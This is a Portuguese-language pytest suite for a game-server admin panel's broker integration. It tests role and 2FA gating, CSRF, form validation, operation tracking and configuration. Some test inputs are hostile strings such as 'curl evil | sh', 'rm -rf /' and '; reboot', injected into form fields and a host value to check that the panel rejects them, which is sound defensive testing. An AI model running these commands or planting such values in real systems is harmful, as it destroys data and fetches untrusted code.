#!/usr/bin/env python3
"""Testes da integracao do painel com o broker (criar instancia de jogo, abrir portas).

    pytest admin/test_broker.py

O broker de verdade nunca e chamado aqui: as funcoes de `broker_client` sao trocadas por um
falso (`monkeypatch`, que desfaz sozinho). O que se testa e o que e do PAINEL: quem pode
abrir estas telas, o que ele manda pedir, como acompanha uma operacao demorada e o que
cadastra no fim - inclusive quando o fim e ruim.
"""
from __future__ import annotations

import time

import pytest

from gamepanel import app as panel
from gamepanel import navigation as ui
from gamepanel.security import totp


# `broker_required` agora exige o segundo fator DA PESSOA, sempre (ver app.py) - nao so
# quando GAMEPANEL_REQUIRE_2FA esta ligado. Quase todo teste deste arquivo precisa chegar
# ATE a view para testar o que quer testar, entao "chefe" AQUI (e so aqui, por causa deste
# override de fixture) ja vem com o 2FA ativo. Quem quer provar a exigencia em si pede
# `sem_2fa`, mais abaixo.
@pytest.fixture
def admin(admin_2fa):
    return admin_2fa


@pytest.fixture
def admin_without_2fa(login):
    """Um admin comum, sem o segundo fator - o caso que a exigencia do broker barra."""
    panel.ensure_admin_user("sem-2fa", "senha-sem-2fa")
    return login("sem-2fa", "senha-sem-2fa")


OP = "a" * 32

GAMES = [
    {"key": "alfa", "name": "Alfa", "app_id": 1001, "ports": ["7001/udp", "7002/udp"],
     "game_port": 7001, "query_port": 7002, "memory_mb": 4096, "cores": 2, "disk_gb": 20,
     "recipes": [], "shiftable": False, "source": "curado", "creatable": True, "reason": ""},
    {"key": "conta", "name": "Jogo com Conta", "app_id": 1004, "ports": ["7200/udp"],
     "game_port": 7200, "query_port": 0, "memory_mb": 4096, "cores": 2, "disk_gb": 20,
     "recipes": [], "shiftable": False, "source": "curado", "creatable": False,
     "reason": "exige conta Steam; use o deploy-game.ps1"},
]

INSTANCE = {
    "id": 7, "ctid": 300, "ip": "10.0.0.30", "game": "alfa", "name": "Servidor do Zeca",
    "hostname": "alfa-300", "state": "ativa", "detail": "",
    "ports": [{"base": 7001, "numero": 7001, "proto": "udp", "papel": "game"},
               {"base": 7002, "numero": 7002, "proto": "udp", "papel": "query"}],
}

RESULTADO = {
    "broker_id": 7, "name": "Servidor do Zeca", "host": "10.0.0.30", "service": "alfa.service",
    "game_port": 7001, "query_port": 7002, "ports": ["7001/udp", "7002/udp"],
    "config_path": "/opt/game/Config", "config_files": ["/opt/game/Config/a.ini"],
    "backup_paths": ["/opt/game/Saves"], "player_source": "log",
    "join_re": r"(?P<name>.+) joined", "leave_re": r"(?P<name>.+) left", "log_path": "",
    "notes": "Criado pelo broker (CT 300)",
}


def refusal(message: str, status: int = 409) -> panel.broker_client.BrokerError:
    return panel.broker_client.BrokerError(message, status)


class FakeBroker:
    def __init__(self) -> None:
        self.games = list(GAMES)
        self.lista = [dict(INSTANCE)]
        self.calls: list[tuple] = []
        self.error: Exception | None = None
        self.operations: list[dict] = [{"state": "ok", "log": "tudo certo\n", "result": RESULTADO}]
        self.tasks: list = []

    def _call(self, name: str, *args) -> None:
        self.calls.append((name, *args))
        if self.error is not None:
            raise self.error

    def catalog(self):
        self._call("catalog")
        return self.games

    def add_game(self, data, actor):
        self._call("add_game", data, actor)
        return {"key": data.get("key")}

    def instances(self):
        self._call("instances")
        return self.lista

    def create(self, game, name, actor):
        self._call("create", game, name, actor)
        return {"operation_id": OP, "instance_id": 7}

    def operation(self, op_id):
        self._call("operation", op_id)
        return self.operations.pop(0) if len(self.operations) > 1 else self.operations[0]

    def deactivate(self, instance_id, actor):
        self._call("deactivate", instance_id, actor)
        return {"id": instance_id, "state": "desativada"}

    def remove(self, instance_id, confirm, actor, db_only=False):
        self._call("remove", instance_id, confirm, actor, db_only)
        return {"id": instance_id, "removed": True}

    def called(self, name: str) -> list[tuple]:
        return [c for c in self.calls if c[0] == name]


@pytest.fixture
def broker(monkeypatch, database):
    """Broker ligado no painel e trocado por um falso. As threads NAO sobem: `_dispara`
    guarda a tarefa em `broker.tarefas` para o teste rodar (ou nao) quando quiser."""
    fake = FakeBroker()
    monkeypatch.setattr(panel, "ALLOW_BROKER", True)
    monkeypatch.setattr(panel, "BROKER_POLL", 0)
    monkeypatch.setattr(panel, "_fire", fake.tasks.append)
    for name in ("catalog", "add_game", "instances", "create", "operation",
                 "deactivate", "remove"):
        monkeypatch.setattr(panel.broker_client, name, getattr(fake, name))
    return fake


def jobs(database) -> list:
    return database.execute("SELECT * FROM jobs ORDER BY id").fetchall()


def new_job(database, op: str = OP) -> int:
    with database:
        cur = database.execute(
            "INSERT INTO jobs (server_id, target, action, status, command, username, created_at, broker_op)"
            " VALUES (NULL, 'broker', 'broker-criar', 'running', 'alfa: Um', 'chefe', ?, ?)",
            (panel.now_iso(), op))
    return int(cur.lastrowid or 0)


def job(database, job_id: int):
    return database.execute("SELECT * FROM jobs WHERE id = ?", (job_id,)).fetchone()


def servers(database) -> list:
    return database.execute("SELECT * FROM servers ORDER BY id").fetchall()


# --------------------------------------------------------------------------- quem abre

ROTAS_GET = ["/catalog", "/instances", "/api/v1/catalog/suggestions?q=palworld"]
ROTAS_POST = ["/catalog/new", "/instances/new", "/instances/7/deactivate", "/instances/7/delete"]


@pytest.mark.parametrize("rota", ROTAS_GET)
def test_operador_leva_403_nas_telas_do_broker(operator, broker, rota):
    assert operator.get(rota).status_code == 403


@pytest.mark.parametrize("rota", ROTAS_POST)
def test_operador_nao_dispara_nada_no_broker(operator, broker, post, rota):
    assert post(operator, rota, {"game": "alfa", "name": "x"}).status_code == 403
    assert broker.calls == []


@pytest.mark.parametrize("rota", ROTAS_GET)
def test_sem_login_vai_para_o_login(client, broker, rota):
    response = client.get(rota)
    assert response.status_code == 302
    assert "/login" in response.headers["Location"]


@pytest.mark.parametrize("rota", ROTAS_GET)
def test_broker_desligado_admin_leva_403(admin, monkeypatch, rota):
    monkeypatch.setattr(panel, "ALLOW_BROKER", False)
    response = admin.get(rota)
    assert response.status_code == 403
    assert "GAMEPANEL_ALLOW_BROKER" in response.get_data(as_text=True)


@pytest.mark.parametrize("rota", ROTAS_POST)
def test_broker_desligado_nao_aceita_post(admin, post, monkeypatch, rota):
    monkeypatch.setattr(panel, "ALLOW_BROKER", False)
    assert post(admin, rota, {"game": "alfa", "name": "x"}).status_code == 403


@pytest.mark.parametrize("rota", ROTAS_POST)
def test_post_sem_csrf_e_barrado(admin, broker, rota):
    response = admin.post(rota, data={"game": "alfa", "name": "x"})
    assert response.status_code == 400
    assert broker.calls == []


def test_menu_so_mostra_o_broker_quando_ligado(admin, broker, monkeypatch):
    enabled = admin.get("/").get_data(as_text=True)
    assert 'href="/instances"' in enabled
    assert 'href="/catalog"' in enabled
    monkeypatch.setattr(panel, "ALLOW_BROKER", False)
    disabled = admin.get("/").get_data(as_text=True)
    assert 'href="/instances"' not in disabled
    assert 'href="/catalog"' not in disabled


# --------------------------------------------------- 2FA obrigatorio para falar com o broker

@pytest.mark.parametrize("rota", ["/catalog", "/instances"])
def test_sem_2fa_a_tela_manda_para_a_ativacao(admin_without_2fa, broker, rota):
    response = admin_without_2fa.get(rota)
    assert response.status_code == 302
    assert response.headers["Location"].endswith("/account/2fa")
    assert broker.calls == []


@pytest.mark.parametrize("rota", ROTAS_POST)
def test_sem_2fa_o_post_e_redirecionado_para_a_ativacao_e_nao_chama_o_broker(admin_without_2fa, broker, post, rota):
    response = post(admin_without_2fa, rota, {"game": "alfa", "name": "x"})
    assert response.status_code == 302
    assert response.headers["Location"].endswith("/account/2fa")
    assert broker.calls == []


def test_sem_2fa_a_api_json_responde_403_em_vez_de_redirecionar(admin_without_2fa, broker):
    response = admin_without_2fa.get("/api/v1/catalog/suggestions?q=palworld")
    assert response.status_code == 403
    assert "duas etapas" in response.get_json()["error"]
    assert broker.calls == []


def test_allow_broker_desligado_vence_mesmo_para_quem_nao_tem_2fa(admin_without_2fa, monkeypatch):
    """A ordem dos dois "guardas" de `broker_required` importa: com o recurso inteiro
    desligado, a mensagem tem de ser sobre isso, nao sobre o 2FA de quem pediu."""
    monkeypatch.setattr(panel, "ALLOW_BROKER", False)
    response = admin_without_2fa.get("/catalog")
    assert response.status_code == 403
    assert "GAMEPANEL_ALLOW_BROKER" in response.get_data(as_text=True)


def test_ativar_o_segundo_fator_libera_as_rotas_do_broker(admin_without_2fa, broker, post):
    assert admin_without_2fa.get("/catalog").status_code == 302
    admin_without_2fa.get("/account/2fa")
    with admin_without_2fa.session_transaction() as sess:
        secret = sess["totp_pendente"]
    enabled = post(admin_without_2fa, "/account/2fa", {"codigo": totp.code(secret, totp.step_of(time.time()))})
    assert enabled.status_code == 200
    assert admin_without_2fa.get("/catalog").status_code == 200


def test_operador_leva_403_antes_mesmo_de_chegar_no_guarda_do_2fa(operator, broker):
    """Admin sem 2FA e barrado; operador (com ou sem 2FA) nem chega la: admin_required
    empilha por fora, entao a mensagem dele e sobre o papel, nao sobre o 2FA."""
    response = operator.get("/catalog")
    assert response.status_code == 403
    assert "administradores" in response.get_data(as_text=True)


def test_itens_visiveis_filtra_por_recurso_e_papel():
    def keys(**kw):
        return {i.key for i in ui.visible_items(ui.NAV_SECONDARY, **kw)}

    assert {"instancias", "catalogo"} <= keys(admin=True, broker=True)
    assert not {"instancias", "catalogo"} & keys(admin=True, broker=False)
    assert not {"instancias", "catalogo", "usuarios", "novo"} & keys(admin=False, broker=True)
    assert "ssh" in keys(admin=False, broker=False)


# ------------------------------------------------------------------------- catalogo

def test_busca_de_jogo_devolve_a_sugestao_com_o_que_o_broker_precisa(admin, broker):
    response = admin.get("/api/v1/catalog/suggestions?q=satisfactory")
    assert response.status_code == 200
    data = response.get_json()
    found = data["resultados"][0]
    assert found["values"]["app_id"] == "1690800"
    assert "8888/tcp" in found["values"]["ports"]
    assert "-ReliablePort=8888" in found["values"]["start_args"]
    assert found["warnings"]
    assert "LinuxGSM" in data["fonte"]


def test_busca_de_jogo_sem_consulta_devolve_lista_vazia(admin, broker):
    assert admin.get("/api/v1/catalog/suggestions").get_json()["resultados"] == []
    assert admin.get("/api/v1/catalog/suggestions?q=%25%25%25").get_json()["resultados"] == []


def test_busca_nao_chama_o_broker(admin, broker):
    """E uma lista fixa do repositorio: nada de rede, nem para o broker."""
    admin.get("/api/v1/catalog/suggestions?q=palworld")
    assert broker.calls == []


def test_catalogo_traz_o_campo_de_busca(admin, broker):
    html = admin.get("/catalog").get_data(as_text=True)
    assert "data-game-search" in html
    assert "/api/v1/catalog/suggestions" in html


def test_catalogo_oferece_o_modelo_de_unreal_com_os_valores_na_marcacao(admin, broker):
    """O seletor nasce escondido e sem `name` (nao vai no envio); o JS le data-values."""
    html = admin.get("/catalog").get_data(as_text=True)
    assert "data-game-template" in html
    assert "Unreal Engine" in html
    assert "LogNet: Join succeeded" in html
    assert "-log -Port={PORT}" in html


def test_catalogo_lista_os_jogos_e_o_motivo_de_nao_criar(admin, broker):
    html = admin.get("/catalog").get_data(as_text=True)
    assert "Alfa" in html
    assert "criavel" in html
    assert "exige conta Steam" in html


def test_catalogo_com_broker_fora_do_ar_nao_e_500(admin, broker):
    broker.error = refusal("nao consegui falar com o broker (ConnectionRefusedError)", 0)
    response = admin.get("/catalog")
    assert response.status_code == 200
    assert "nao consegui falar com o broker" in response.get_data(as_text=True)


GAME_FORM = {
    "key": "meujogo", "name": "Meu Jogo", "app_id": "123456", "ports": "7777/udp, 27016/udp",
    "game_port": "7777", "query_port": "27016", "start_script": "Server.sh",
    "start_args": "-port={PORT}", "memory_mb": "8192", "cores": "4", "disk_gb": "40",
    "config_path": "/opt/game/Config", "config_files": "/opt/game/Config/a.ini\n/opt/game/Config/b.ini",
    "backup_paths": "/opt/game/Saves", "player_source": "log", "platform": "windows",
    "join_re": "(?P<name>.+) joined", "shiftable": "1",
}


def test_novo_jogo_manda_ao_broker_so_dados_ja_convertidos(admin, broker, post):
    data = {**GAME_FORM, "recipes": ["wine", "rm -rf /"]}
    response = post(admin, "/catalog/new", data)
    assert response.status_code == 302
    (_, sent, actor), = broker.called("add_game")
    assert actor == "chefe"
    assert sent["app_id"] == 123456
    assert sent["game_port"] == 7777
    assert sent["ports"] == ["7777/udp", "27016/udp"]
    assert sent["config_files"] == ["/opt/game/Config/a.ini", "/opt/game/Config/b.ini"]
    assert sent["shiftable"] is True
    assert sent["recipes"] == ["wine"], "receita fora da lista nem e enviada"
    assert sent["platform"] == "windows"


def test_novo_jogo_nunca_envia_campo_de_comando(admin, broker, post):
    """O painel so repassa os campos do formulario: nada que o usuario invente na mao
    (pre_install_cmd, por exemplo) chega ao broker."""
    post(admin, "/catalog/new", {**GAME_FORM, "pre_install_cmd": "curl evil | sh",
                                     "post_install_cmd": "reboot"})
    (_, sent, _), = broker.called("add_game")
    assert not {"pre_install_cmd", "post_install_cmd"} & set(sent)


def test_novo_jogo_deixa_rastro_no_historico(admin, broker, post, database):
    post(admin, "/catalog/new", GAME_FORM)
    (line,) = jobs(database)
    assert (line["action"], line["username"], line["status"]) == ("broker-jogo", "chefe", "ok")
    assert line["server_id"] is None


@pytest.mark.parametrize("field", ["app_id", "game_port", "memory_mb", "cores", "disk_gb"])
@pytest.mark.parametrize("lixo", ["abc", "12.5", "-1", "²", "1 2"])
def test_numero_invalido_nem_chega_ao_broker(admin, broker, post, field, lixo):
    response = post(admin, "/catalog/new", {**GAME_FORM, field: lixo})
    assert response.status_code == 400
    assert "deve ser um numero" in response.get_data(as_text=True)
    assert broker.called("add_game") == []


def test_recusa_do_broker_volta_ao_formulario_com_o_que_foi_digitado(admin, broker, post):
    broker.error = refusal("start_args: formato invalido", 400)
    response = post(admin, "/catalog/new", {**GAME_FORM, "start_args": "; reboot"})
    html = response.get_data(as_text=True)
    assert response.status_code == 400
    assert "start_args: formato invalido" in html
    assert 'value="Server.sh"' in html, "o formulario nao pode perder o que a pessoa digitou"


# ---------------------------------------------------------------------------- instancias

def test_instancias_mostra_a_lista_e_so_jogos_criaveis_no_formulario(admin, broker):
    html = admin.get("/instances").get_data(as_text=True)
    assert "Servidor do Zeca" in html
    assert "10.0.0.30" in html
    assert "7001/udp" in html
    assert 'value="alfa"' in html
    assert 'value="conta"' not in html


def test_instancia_ligada_a_um_servidor_vira_link(admin, broker, database):
    panel.ensure_server(panel.DeployServer(
        name="Servidor do Zeca", host="10.0.0.30", service="alfa.service", broker_id=7))
    sid = servers(database)[0]["id"]
    assert f'href="/servers/{sid}"' in admin.get("/instances").get_data(as_text=True)


def test_instancias_com_broker_fora_do_ar(admin, broker):
    broker.error = refusal("nao consegui falar com o broker (TimeoutError)", 0)
    response = admin.get("/instances")
    assert response.status_code == 200
    assert "nao consegui falar com o broker" in response.get_data(as_text=True)


def test_criar_abre_um_job_sem_servidor_e_redireciona_para_ele(admin, broker, post, database):
    response = post(admin, "/instances/new", {"game": "alfa", "name": "Servidor do Zeca"})
    (line,) = jobs(database)
    assert response.headers["Location"].endswith(f"/jobs/{line['id']}")
    assert broker.called("create") == [("create", "alfa", "Servidor do Zeca", "chefe")]
    assert (line["action"], line["status"], line["broker_op"]) == ("broker-criar", "running", OP)
    assert line["server_id"] is None
    assert line["command"] == "alfa: Servidor do Zeca"
    assert len(broker.tasks) == 1, "o acompanhamento foi disparado uma vez"


def test_criar_recusado_pelo_broker_nao_deixa_job(admin, broker, post, database):
    broker.error = refusal("limite de 8 instancias atingido", 429)
    response = post(admin, "/instances/new", {"game": "alfa", "name": "x"})
    assert response.status_code == 302
    assert "limite de 8 instancias" in admin.get("/instances").get_data(as_text=True)
    assert jobs(database) == []
    assert broker.tasks == []


def test_criar_sem_id_de_operacao_nao_deixa_job(admin, broker, post, database, monkeypatch):
    monkeypatch.setattr(panel.broker_client, "create", lambda *a: {})
    post(admin, "/instances/new", {"game": "alfa", "name": "x"})
    assert jobs(database) == []


def test_tela_do_job_abre_e_tem_o_rotulo(admin, broker, post, database):
    post(admin, "/instances/new", {"game": "alfa", "name": "x"})
    (line,) = jobs(database)
    html = admin.get(f"/jobs/{line['id']}").get_data(as_text=True)
    assert "Instancia criada (broker)" in html
    assert admin.get(f"/api/v1/jobs/{line['id']}").get_json()["status"] == "running"


def test_saida_do_job_do_broker_e_so_de_admin(admin, operator, broker, post, database):
    """A saida cita IP, CTID e portas da infraestrutura: operador nem abre nem lista."""
    post(admin, "/instances/new", {"game": "alfa", "name": "x"})
    (line,) = jobs(database)
    assert operator.get(f"/jobs/{line['id']}").status_code == 403
    assert operator.get(f"/api/v1/jobs/{line['id']}").status_code == 403
    link = f"/jobs/{line['id']}"
    assert link in admin.get("/history").get_data(as_text=True), "o admin ve o job na lista"
    assert link not in operator.get("/history").get_data(as_text=True)


# ------------------------------------------------------------- acompanhar a operacao

def test_o_log_aparece_no_job_enquanto_a_operacao_ainda_roda(broker, database):
    broker.operations = [
        {"state": "executando", "log": "criando o container 300\n"},
        {"state": "executando", "log": "criando o container 300\ninstalando o jogo\n"},
        {"state": "ok", "log": "criando o container 300\ninstalando o jogo\npronto\n", "result": RESULTADO},
    ]
    job_id = new_job(database)
    seen_ones: list[str] = []
    panel.follow_operation(job_id, OP, sleep=lambda _s: seen_ones.append(job(database, job_id)["output"]))
    assert seen_ones[0] == "criando o container 300\n"
    assert seen_ones[1].endswith("instalando o jogo\n"), "o progresso apareceu ANTES de terminar"
    assert job(database, job_id)["status"] == "ok"


def test_operacao_ok_cadastra_o_servidor_e_liga_o_job_a_ele(broker, database):
    job_id = new_job(database)
    panel.follow_operation(job_id, OP, sleep=lambda _s: None)
    (server,) = servers(database)
    assert (server["name"], server["host"], server["service"]) == ("Servidor do Zeca", "10.0.0.30", "alfa.service")
    assert server["broker_id"] == 7
    assert server["game_port"] == "7001/udp 7002/udp"
    assert server["query_port"] == 7002
    assert server["config_files"] == "/opt/game/Config/a.ini"
    assert server["backup_paths"] == "/opt/game/Saves"
    assert server["player_source"] == "log"
    final = job(database, job_id)
    assert (final["status"], final["exit_code"], final["server_id"]) == ("ok", 0, server["id"])
    assert "Servidor cadastrado no painel" in final["output"]
    assert final["finished_at"]


def test_operacao_com_erro_fecha_o_job_com_o_log_e_nao_cadastra(broker, database):
    broker.operations = [{"state": "erro", "log": "instalando\nERRO: steamcmd falhou\nreserva liberada\n"}]
    job_id = new_job(database)
    panel.follow_operation(job_id, OP, sleep=lambda _s: None)
    final = job(database, job_id)
    assert (final["status"], final["exit_code"]) == ("error", 1)
    assert "steamcmd falhou" in final["output"]
    assert servers(database) == []


@pytest.mark.parametrize("field", ["host", "service"])
def test_resultado_estranho_do_broker_nao_vira_servidor_e_avisa_que_o_ct_existe(broker, database, field):
    bad = {**RESULTADO, field: "10.0.0.30; rm -rf /" if field == "host" else "a b.service"}
    broker.operations = [{"state": "ok", "log": "feito\n", "result": bad}]
    job_id = new_job(database)
    panel.follow_operation(job_id, OP, sleep=lambda _s: None)
    final = job(database, job_id)
    assert final["status"] == "error"
    assert "A instancia foi criada, mas nao consegui cadastra-la" in final["output"]
    assert servers(database) == []


def test_resultado_incompleto_tambem_avisa(broker, database):
    broker.operations = [{"state": "ok", "log": "feito\n", "result": {"name": "x"}}]
    job_id = new_job(database)
    panel.follow_operation(job_id, OP, sleep=lambda _s: None)
    assert "A instancia foi criada" in job(database, job_id)["output"]


def test_perder_o_contato_com_o_broker_da_o_job_por_falho(broker, database, monkeypatch):
    monkeypatch.setattr(panel, "BROKER_FAILURES_MAX", 3)
    broker.error = refusal("nao consegui falar com o broker (TimeoutError)", 0)
    job_id = new_job(database)
    waits: list[float] = []
    panel.follow_operation(job_id, OP, sleep=waits.append)
    final = job(database, job_id)
    assert final["status"] == "error"
    assert "Perdi o contato com o broker" in final["output"]
    assert len(waits) == 2, "tentou 3 vezes, dormindo entre elas"


def test_falha_isolada_de_contato_nao_derruba_o_acompanhamento(broker, database, monkeypatch):
    responses = iter([refusal("nao consegui falar com o broker (TimeoutError)", 0), None])

    def operation(op_id):
        first_one = next(responses)
        if first_one is not None:
            raise first_one
        return {"state": "ok", "log": "feito\n", "result": RESULTADO}

    monkeypatch.setattr(panel.broker_client, "operation", operation)
    job_id = new_job(database)
    panel.follow_operation(job_id, OP, sleep=lambda _s: None)
    assert job(database, job_id)["status"] == "ok"


def test_tempo_esgotado(broker, database, monkeypatch):
    monkeypatch.setattr(panel, "JOB_TIMEOUT", -1)
    job_id = new_job(database)
    panel.follow_operation(job_id, OP, sleep=lambda _s: None)
    final = job(database, job_id)
    assert final["status"] == "error"
    assert "Tempo esgotado" in final["output"]


def test_tarefa_disparada_pela_rota_faz_o_caminho_inteiro(admin, broker, post, database):
    post(admin, "/instances/new", {"game": "alfa", "name": "Servidor do Zeca"})
    broker.tasks[0]()
    (line,) = jobs(database)
    assert line["status"] == "ok"
    assert servers(database)[0]["broker_id"] == 7


# ------------------------------------------------------ retomar depois de um restart

def test_restart_retoma_o_que_ainda_estava_rodando(broker, database):
    running = new_job(database, op="b" * 32)
    finished = new_job(database, op="c" * 32)
    with database:
        database.execute("UPDATE jobs SET status = 'ok' WHERE id = ?", (finished,))
        database.execute("INSERT INTO jobs (target, action, status, username, created_at)"
                      " VALUES ('x', 'restart', 'running', 'u', ?)", (panel.now_iso(),))
    assert panel.resume_broker_jobs() == 1
    assert len(broker.tasks) == 1
    broker.tasks[0]()
    assert job(database, running)["status"] == "ok"
    assert broker.called("operation") == [("operation", "b" * 32)]


def test_broker_desligado_nao_retoma_nada(broker, database, monkeypatch):
    new_job(database)
    monkeypatch.setattr(panel, "ALLOW_BROKER", False)
    assert panel.resume_broker_jobs() == 0
    assert broker.tasks == []


# ---------------------------------------------------------- desativar e remover

def test_desativar_pede_ao_broker_e_deixa_rastro(admin, broker, post, database):
    response = post(admin, "/instances/7/deactivate")
    assert response.status_code == 302
    assert broker.called("deactivate") == [("deactivate", 7, "chefe")]
    (line,) = jobs(database)
    assert (line["action"], line["status"]) == ("broker-desativar", "ok")


def test_desativar_recusado_mostra_o_motivo(admin, broker, post, database):
    broker.error = refusal("so uma instancia ativa pode ser desativada")
    post(admin, "/instances/7/deactivate")
    assert "so uma instancia ativa" in admin.get("/instances").get_data(as_text=True)
    assert jobs(database)[0]["status"] == "error"


def test_remover_apaga_tambem_o_servidor_do_painel(admin, broker, post, database):
    panel.ensure_server(panel.DeployServer(
        name="Servidor do Zeca", host="10.0.0.30", service="alfa.service", broker_id=7))
    panel.ensure_server(panel.DeployServer(name="Outro", host="10.0.0.99", service="x.service"))
    post(admin, "/instances/7/delete", {"confirmation": "Servidor do Zeca"})
    assert broker.called("remove") == [("remove", 7, "Servidor do Zeca", "chefe", False)]
    assert [s["name"] for s in servers(database)] == ["Outro"], "so o da instancia removida some"


def test_remover_recusado_nao_apaga_o_servidor(admin, broker, post, database):
    panel.ensure_server(panel.DeployServer(
        name="Servidor do Zeca", host="10.0.0.30", service="alfa.service", broker_id=7))
    broker.error = refusal("digite o nome exato da instancia para confirmar", 400)
    post(admin, "/instances/7/delete", {"confirmation": "errado"})
    assert len(servers(database)) == 1
    assert "nome exato" in admin.get("/instances").get_data(as_text=True)


def test_somente_banco_e_repassado(admin, broker, post):
    post(admin, "/instances/7/delete", {"confirmation": "x", "db_only": "1"})
    assert broker.called("remove")[0][4] is True


def test_remover_sem_marcar_somente_banco_manda_falso(admin, broker, post):
    post(admin, "/instances/7/delete", {"confirmation": "x"})
    assert broker.called("remove")[0][4] is False


# ------------------------------------------------------------------- esquema e config

def test_colunas_novas_existem(database):
    servers = {r["name"] for r in database.execute("PRAGMA table_info(servers)")}
    assert "broker_id" in servers
    assert "broker_op" in {r["name"] for r in database.execute("PRAGMA table_info(jobs)")}


def test_servidor_cadastrado_a_mao_tem_broker_id_zero(database):
    panel.ensure_server(panel.DeployServer(name="Manual", host="10.0.0.5", service="x.service"))
    assert servers(database)[0]["broker_id"] == 0


def test_redeploy_nao_perde_a_ligacao_com_a_instancia(database):
    data = panel.DeployServer(name="Z", host="10.0.0.30", service="a.service", broker_id=7)
    panel.ensure_server(data)
    panel.ensure_server(data._replace(name="Z2"))
    (server,) = servers(database)
    assert (server["name"], server["broker_id"]) == ("Z2", 7)


@pytest.fixture
def broker_environment(monkeypatch, tmp_path):
    token = tmp_path / "token"
    token.write_text("t" * 40 + "\n")
    monkeypatch.setattr(panel, "BROKER_REQUESTED", True)
    monkeypatch.setattr(panel, "BROKER_URL", "https://broker.exemplo:8443")
    monkeypatch.setattr(panel, "BROKER_TOKEN_FILE", str(token))
    monkeypatch.setattr(panel, "BROKER_CERT_SHA256", "ab" * 32)
    monkeypatch.setattr(panel.broker_client, "_config", {})
    return token


def test_config_liga_o_broker_com_token_de_arquivo(broker_environment):
    assert panel._configure_broker() is True
    assert panel.broker_client.is_configured()


def test_config_desligada_por_padrao(broker_environment, monkeypatch):
    monkeypatch.setattr(panel, "BROKER_REQUESTED", False)
    assert panel._configure_broker() is False
    assert not panel.broker_client.is_configured()


@pytest.mark.parametrize("estrago", ["sem-arquivo", "token-curto", "http-fora-do-loopback", "impressao-ruim"])
def test_config_ruim_desliga_o_recurso_sem_derrubar_o_painel(broker_environment, monkeypatch, estrago):
    if estrago == "sem-arquivo":
        monkeypatch.setattr(panel, "BROKER_TOKEN_FILE", "/nao/existe")
    elif estrago == "token-curto":
        broker_environment.write_text("curto")
    elif estrago == "http-fora-do-loopback":
        monkeypatch.setattr(panel, "BROKER_URL", "http://broker.exemplo:8443")
    else:
        monkeypatch.setattr(panel, "BROKER_CERT_SHA256", "isto-nao-e-hex")
    assert panel._configure_broker() is False
